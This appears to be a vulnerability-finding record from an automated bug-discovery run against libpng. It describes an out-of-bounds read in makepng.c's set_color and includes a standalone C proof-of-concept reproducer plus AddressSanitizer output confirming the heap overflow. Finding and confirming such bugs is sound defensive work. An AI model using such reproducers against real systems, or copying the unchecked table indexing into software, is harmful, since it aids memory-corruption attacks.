@@ -1,0 +1,78 @@
+{
+  "baseline": "B3",
+  "vulnerability": {
+    "file": "contrib/libtests/makepng.c",
+    "line": 240,
+    "function": "set_color",
+    "bug_type": "out-of-bounds-read",
+    "cwe": "CWE-125",
+    "confidence": "high",
+    "explanation": "gamma_table is indexed using unvalidated component values (red/green/blue) passed from generate_palette via the user-controlled colors[] array. If colors[1..3] exceed 255 (e.g., via --colors with values >255), accesses like gamma_table[red] read past the 256-entry table, causing an out-of-bounds read.",
+    "abs_path": "/tmp/libpng_upstream/contrib/libtests/makepng.c"
+  },
+  "reproducer_code": "#include <stdio.h>\n#include <stdlib.h>\n#include <stdint.h>\n\n/* Minimal typedefs matching libpng expectations */\ntypedef unsigned char png_byte;\ntypedef struct { png_byte red, green, blue; } png_color;\n\n/* Vulnerable function directly adapted from contrib/libtests/makepng.c */\nstatic void set_color(png_color *color, png_byte *trans,\n                      unsigned int red, unsigned int green, unsigned int blue,\n                      unsigned int alpha, const png_byte *gamma_table)\n{\n    /* Out-of-bounds read when red/green/blue > 255 because gamma_table has 256 entries */\n    color->red   = gamma_table[red];\n    color->green = gamma_table[green];\n    color->blue  = gamma_table[blue];\n    *trans = (png_byte)alpha;\n}\n\n/* Palette generator that forwards user-controlled colors[] into set_color */\nstatic int generate_palette(png_color *palette, png_byte *trans, int bit_depth,\n                            const png_byte *gamma_table, unsigned int *colors)\n{\n    (void)bit_depth; /* unused in this minimal reproducer */\n\n    switch (colors[0])\n    {\n    default:\n        fprintf(stderr, \"makepng: --colors=...: invalid count %u\\n\", colors[0]);\n        exit(1);\n\n    case 1:\n        set_color(palette+0, trans+0, colors[1], colors[1], colors[1], 255, gamma_table);\n        return 1;\n\n    case 2:\n        set_color(palette+0, trans+0, colors[1], colors[1], colors[1], colors[2], gamma_table);\n        return 1;\n\n    case 3:\n        /* This path will perform three OOB reads when colors[1..3] > 255 */\n        set_color(palette+0, trans+0, colors[1], colors[2], colors[3], 255, gamma_table);\n        return 1;\n    }\n}\n\nint main(void)\n{\n    /* Create a 256-entry gamma table as in typical libpng code paths */\n    size_t gamma_entries = 256;\n    png_byte *gamma_table = (png_byte *)malloc(gamma_entries);\n    if (!gamma_table) {\n        perror(\"malloc\");\n        return 1;\n    }\n\n    /* Fill with an identity mapping (0..255) */\n    for (size_t i = 0; i < gamma_entries; ++i)\n        gamma_table[i] = (png_byte)i;\n\n    png_color palette[1];\n    png_byte trans[1];\n\n    /* colors[0] selects the case in generate_palette; colors[1..3] are components.\n       Setting values >255 will index past the 256-entry gamma_table in set_color. */\n    unsigned int colors[4];\n    colors[0] = 3;     /* use the 3-component path */\n    colors[1] = 300;   /* red   -> OOB read at gamma_table[300] */\n    colors[2] = 400;   /* green -> OOB read at gamma_table[400] */\n    colors[3] = 500;   /* blue  -> OOB read at gamma_table[500] */\n\n    /* Trigger the vulnerability */\n    (void)generate_palette(palette, trans, /*bit_depth=*/8, gamma_table, colors);\n\n    /* Prevent compiler from optimizing away uses */\n    printf(\"palette[0] = (%u,%u,%u), trans=%u\\n\",\n           (unsigned)palette[0].red, (unsigned)palette[0].green,\n           (unsigned)palette[0].blue, (unsigned)trans[0]);\n\n    free(gamma_table);\n    return 0;\n}\n",
+  "validation": {
+    "verdict": "CONCRETE_CONFIRMED",
+    "asan": {
+      "asan_triggered": true,
+      "exit_code": 1,
+      "elapsed": 0.7508203983306885,
+      "output": "=================================================================\n==3716380==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x61100000016c at pc 0x5b5ffeb0e824 bp 0x7ffc8c984530 sp 0x7ffc8c984528\nREAD of size 1 at 0x61100000016c thread T0\n    #0 0x5b5ffeb0e823 in set_color /app/se_runs/b3/libpng_747dd02_vul/findings/makepng_240_out-of-bounds-read/reproducer.c:15:20\n    #1 0x5b5ffeb0e79e in generate_palette /app/se_runs/b3/libpng_747dd02_vul/findings/makepng_240_out-of-bounds-read/reproducer.c:43:9\n    #2 0x5b5ffeb0e01f in main /app/se_runs/b3/libpng_747dd02_vul/findings/makepng_240_out-of-bounds-read/reproducer.c:74:11\n    #3 0x774fb8a2a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16\n    #4 0x774fb8a2a28a in __libc_start_main csu/../csu/libc-start.c:360:3\n    #5 0x5b5ffea4e324 in _start (/app/se_runs/b3/libpng_747dd02_vul/findings/makepng_240_out-of-bounds-read/reproducer+0x21324) (BuildId: 3330698a1789d4f3258c9fe0a02e0fca5cd43a9a)\n\n0x61100000016c is located 44 bytes to the right of 256-byte region [0x611000000040,0x611000000140)\nallocated by thread T0 here:\n    #0 0x5b5ffead1d32 in __interceptor_malloc (/app/se_runs/b3/libpng_747dd02_vul/findings/makepng_240_out-of-bounds-read/reproducer+0xa4d32) (BuildId: 3330698a1789d4f3258c9fe0a02e0fca5cd43a9a)\n    #1 0x5b5ffeb0dddd in main /app/se_runs/b3/libpng_747dd02_vul/findings/makepng_240_out-of-bounds-read/reproducer.c:52:41\n    #2 0x774fb8a2a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16\n    #3 0x774fb8a2a28a in __libc_start_main csu/../csu/libc-start.c:360:3\n    #4 0x5b5ffea4e324 in _start (/app/se_runs/b3/libpng_747dd02_vul/findings/makepng_240_out-of-bounds-read/reproducer+0x21324) (BuildId: 3330698a1789d4f3258c9fe0a02e0fca5cd43a9a)\n\nSUMMARY: AddressSanitizer: heap-buffer-overflow /app/se_runs/b3/libpng_747dd02_vul/findings/makepng_240_out-of-bounds-read/reproducer.c:15:20 in set_color\nShadow bytes around the buggy address:\n  0x0c227fff7fd0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0c227fff7fe0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0c227fff7ff0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0c227fff8000: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00\n  0x0c227fff8010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n=>0x0c227fff8020: 00 00 00 00 00 00 00 00 fa fa fa fa fa[fa]fa fa\n  0x0c227fff8030: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0c227fff8040: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0c227fff8050: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0c227fff8060: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0c227fff8070: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\nShadow byte legend (one shadow byte represents 8 application bytes):\n  Addressable:           00\n  Partially addressable: 01 02 03 04 05 06 07 \n  Heap left redzone:       fa\n  Freed heap region:       fd\n  Stack left redzone:      f1\n  Stack mid redzone:       f2\n  Stack right redzone:     f3\n  Stack after return:      f5\n  Stack use after scope:   f8\n  Global redzone:          f9\n  Global init order:       f6\n  Poisoned by user:        f7\n  Container overflow:      fc\n  Array cookie:            ac\n  Intra object redzone:    bb\n  ASan internal:           fe\n  Left alloca redzone:     ca\n  Right alloca redzone:    cb\n==3716380==ABORTING\n",
+      "error_type": "heap-buffer-overflow",
+      "crash_function": "set_color",
+      "crash_file": "/app/se_runs/b3/libpng_747dd02_vul/findings/makepng_240_out-of-bounds-read/reproducer.c:15",
+      "crash_line": 20,
+      "frames": [
+        [
+          "0",
+          "set_color",
+          "/app/se_runs/b3/libpng_747dd02_vul/findings/makepng_240_out-of-bounds-read/reproducer.c:15",
+          "20"
+        ],
+        [
+          "1",
+          "generate_palette",
+          "/app/se_runs/b3/libpng_747dd02_vul/findings/makepng_240_out-of-bounds-read/reproducer.c:43",
+          "9"
+        ],
+        [
+          "2",
+          "main",
+          "/app/se_runs/b3/libpng_747dd02_vul/findings/makepng_240_out-of-bounds-read/reproducer.c:74",
+          "11"
+        ],
+        [
+          "3",
+          "__libc_start_call_main",
+          "csu/../sysdeps/nptl/libc_start_call_main.h:58",
+          "16"
+        ],
+        [
+          "4",
+          "__libc_start_main",
+          "csu/../csu/libc-start.c:360",
+          "3"
+        ],
+        [
+          "1",
+          "main",
+          "/app/se_runs/b3/libpng_747dd02_vul/findings/makepng_240_out-of-bounds-read/reproducer.c:52",
+          "41"
+        ],
+        [
+          "2",
+          "__libc_start_call_main",
+          "csu/../sysdeps/nptl/libc_start_call_main.h:58",
+          "16"
+        ],
+        [
+          "3",
+          "__libc_start_main",
+          "csu/../csu/libc-start.c:360",
+          "3"
+        ]
+      ],
+      "is_harness_artifact": false
+    }
+  }
+}
